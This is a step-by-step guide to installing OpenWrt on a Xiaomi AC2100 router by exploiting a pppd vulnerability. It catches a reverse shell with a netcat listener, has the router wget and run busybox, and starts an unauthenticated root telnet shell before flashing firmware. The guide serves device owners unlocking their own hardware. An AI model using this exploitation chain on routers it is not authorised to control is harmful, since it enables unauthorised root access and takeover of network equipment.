## Acknowledgements and resources

This guide is based on the video of [Èü©È£é Talk](https://www.youtube.com/watch?v=xexqu3veedw). Since many people don't know any Mandarin or don't use Windows, I've decided to write down my method of getting this to work. This is also helping people to understand more about the process rather than using a one-click solution.

## Migrating from old image

**You can skip reading this when you didn't flash with the old guide**.

In case you used the Chinese Redmi image you can use the `sysupgrade` package provided in this repo. Since the R2100 (Black Cylinder) now is uniquely identified you will need to force the system upgrade.

Use any tool of your choice to transfer the sysupgrade.bin to the `/tmp` directory of your router

```sh
sysupgrade -v -F -n /tmp/xiaomi-router-sysupgrade.bin
```

## Intro and Setup

If you find any mistakes in this guide, _please_ submit a PR üëçüèª.

### **Disclaimer:**

**You can potentially brick your device. I don't take responsibility for any damage caused.**

### Requirements

1. A computer with an ethernet adapter
2. Two LAN cables
3. python3, scapy, netcat
4. Files from this repo
   - busybox
   - [pppoe-simulator.py](https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit)
   - [pppd-cve.py](https://gist.github.com/namidairo/1e3fb3404c9f148474c06ae6616962f3)
   - xiaomi-router-kernel1.bin
   - xiaomi-router-rootfs0.bin

Install instructions are available for macOS and Ubuntu. In case you use Windows or an other Linux distribution, I assume you are smart enough to install the required packages yourself.

Please note that python3 is aliased to `python3` on macOS and Ubuntu (and in some other GNU/Linux distributions). Replace `python3` and `pip3` with `python` and `pip` on Windows - GNU/Linux accordingly.

## Installing packages (macOS)

Before we start, please check your python version with:

```sh
python3 --version
```

Version 2 will **not** work.


In case you don't have a version of Python installed (or you have the version 2) go to https://brew.sh/ and run the installation script in your terminal, then proceed to install the required packages:

```sh
brew install python3 netcat
```

Install `scapy` for python:

```sh
pip3 install scapy
```

## Installing packages (Ubuntu)

Thanks to @albertodlc for the instructions.

Before we start, please open a terminal  (`ctrl + t`) and check your python version with:

```sh
python3 --version
```

Version 2 will **not** work.

In case you don't have a version of Python installed (or you have the version 2), proceed to install the required packages with:

```sh
sudo apt update
sudo apt install python3
sudo apt install python3-pip
```

And also check if you have all the network packages and dependencies:

```sh
ifconfig
```

If it shows an error, run the following command:

```sh
sudo apt install net-tools
```

Then install `scapy` and `netcat` for python:

(Don't forget the `sudo` in the first command)
```sh
sudo apt install python3-scapy
pip3 install netcat
```

## Installing OpenWRT
### 1. Download files

- Clone the repo or download as `.zip`
- Make a folder with the following files and `cd` into it

<p align="center">
    <img height="auto" width="auto" src="images/1.png" />
</p>

Feel free to use your own images if you know what you are doing. For the case you are using the images in this repo, please ensure the provided `.bin` files have the correct `sha256sum`:

<!-- BEGIN-SHA256SUM -->

```sh
sha256sum *bin
63dba28c89e3df484419aa9079c4fc80ef183f1dcc4591d9935c25fde65f49e4  xiaomi-router-initramfs-kernel.bin
deb8b1b0c5b9c0ada4f944382ba935c9e1c132faea88818f19790564b3e74fde  xiaomi-router-kernel1.bin
4b7d9766d8f5454a5733fbb0ad15eee6bf92e18cdbe6a043f755e3812ba21718  xiaomi-router-rootfs0.bin
c7ee444c818097c67aca16aafdb3e983f3716d05256367e0244db8fc3a0d36b4  xiaomi-router-sysupgrade.bin
```

<!-- END-SHA256SUM -->

### 2. Reset your router

- Plug in your AC2100
- Wait for the system light to turn blue
- Hold the reset button until the light turns yellow
- Plug out your router

### 3. Insert LAN cables

- Bridge WAN and Port 1 (blue) with your first LAN cable
- Connect the second LAN cable to Port 2 and your computer (yellow)

<p align="center">
    <img height="auto" width="auto" src="images/router_back.jpg" />
</p>

### 4. Setup TCP/IP

- Go to your network settings
- Set the following for IPv4

<p align="center">
    <img height="auto" width="auto" src="images/2.png" />
    <img height="auto" width="auto" src="images/2-1.png" />
</p>

- Plug in your router
- Wait for the indicator LED to turn blue

You should now be able to ping the router at `192.168.31.1`.

<p align="center">
    <img height="auto" width="auto" src="images/3.png" />
</p>

### 5. Determining your network interface

- Run `ifconfig`
- Check for an interface with configured address `192.168.31.177` (see image below)
- Change the name of your interface in `ppd-cve.py` and `pppoe-simulator.py` (in my case it was en7)

```py
# Line 5 of both script files
interface = "yourinterface"
```

<p align="center">
    <img height="auto" width="auto" src="images/4.png" />
</p>

- Check the MAC address from [`pppd-cve.py`](https://github.com/impulse/ac2100-openwrt-guide/blob/master/pppd-cve.py#L17) and adjust it accordingly to your device (you can check it in the bottom of the router).

```py
# pppd-cve.py#L17
if src.startswith("your:router:mac")
```

### 6. PPPoE simulator

- Open up http://192.168.31.1 in your browser
- If there is a terms and conditions screen, click on È©¨‰∏ä‰ΩìÈ™å
- Click on ÁªßÁª≠ÈÖçÁΩÆ (see image)

<p align="center">
    <img height="auto" width="auto" src="images/5.png" />
</p>

Start the `pppoe-simulator`:

```sh
python3 pppoe-simulator.py
```

You may need to run this as `root` for scapy to function properly. The script should show `Waiting for packets`.

<p align="center">
    <img height="auto" width="auto" src="images/6.png" />
</p>

Click on the field that says PPPOE.

<p align="center">
    <img height="auto" width="auto" src="images/7.png" />
</p>

Enter credentials (anything should be fine). I just use `123` for both. After that click on ‰∏ã‰∏ÄÊ≠•.

<p align="center">
    <img height="auto" width="auto" src="images/8.png" />
</p>

Requests should now appear in your PPPoE terminal window:

<p align="center">
    <img height="auto" width="auto" src="images/9.png" />
</p>

Also your web browser should now display this instead of a loading spinner:

<p align="center">
    <img height="auto" width="auto" src="images/10.png" />
</p>

### 7. Running the exploit

Open up two new terminal sessions.

Start an HTTP server where we can `wget` the files from later. **Make sure to be in the folder that contains the repo files**.

```sh
python3 -m http.server 80
```

Start the `netcat` network utility.

```sh
netcat -nvlp 31337
```

<p align="center">
    <img height="auto" width="auto" src="images/11.png" />
</p>

Run `pppd-cve.py` in a new terminal session:

```sh
python3 pppd-cve.py
```

<p align="center">
    <img height="auto" width="auto" src="images/12.png" />
</p>

When the packet has been sent successfully, you should be able to see a connection from `192.168.31.1:63627` in your `netcat` session.

This connection can be unstable and you may need to rerun `netcat` and `pppd-cve.py` if it drops.

If you do the following commands quickly, there should be no issues:

```sh
cd /tmp
wget http://192.168.31.177/busybox
chmod a+x ./busybox
./busybox telnetd -l /bin/sh
```

<p align="center">
    <img height="auto" width="auto" src="images/13.png" />
</p>

We should now have `telnet` access (you can find all commands in `commands.txt`):

```sh
telnet 192.168.31.1
```

<p align="center">
    <img height="auto" width="auto" src="images/14.png" />
</p>

Use `wget` to pull our files from the http server on the router:

```sh
wget http://192.168.31.177/xiaomi-router-rootfs0.bin
wget http://192.168.31.177/xiaomi-router-kernel1.bin&&nvram set uart_en=1&&nvram set bootdelay=5&&nvram set flag_try_sys1_failed=1&&nvram commit
```

Observation: Files are being requested in your http server session:

<p align="center">
    <img height="auto" width="auto" src="images/15.png" />
</p>

All what is left now is to write our images:

```sh
mtd write xiaomi-router-kernel1.bin kernel1
mtd -r write xiaomi-router-rootfs0.bin rootfs0
```

<p align="center">
    <img height="auto" width="auto" src="images/16.png" />
</p>

Your device should now reboot. First the LED blinks yellow for a couple of seconds before turning blue. When it turns blue again, you now have successfully set up OpenWrt. Congratulations!

What you can do now:

- Close all terminal sessions
- Revert your TCP/IP settings
- Remove the bridge cable
- Connect the router to the internet again

### 8. Post-install

#### Connect to your device via `ssh`

```
username: root
password: password
```

The router IP should be visible in your network settings (in my case http://192.168.1.1). LuCI web-interface is configured with HTTPS on this image. To use HTTPS you need to take additional steps to trust the certificate on your machine. If you want to just bypass the HTTPS errors you will need to use Firefox and add an exception.

<p align="center">
    <img height="auto" width="auto" src="images/17.png" />
</p>

```sh
ssh root@routerip
```

<p align="center">
    <img height="auto" width="auto" src="images/18.png" />
</p>

## Miscellaneous

### Flash commands

Partition names if you are already on OpenWRT:

```sh
mtd write xiaomi-router-kernel1.bin kernel
mtd write xiaomi-router-rootfs0.bin ubi
```

Partition names if you are on stock firmware:

```sh
mtd write xiaomi-router-kernel1.bin kernel1
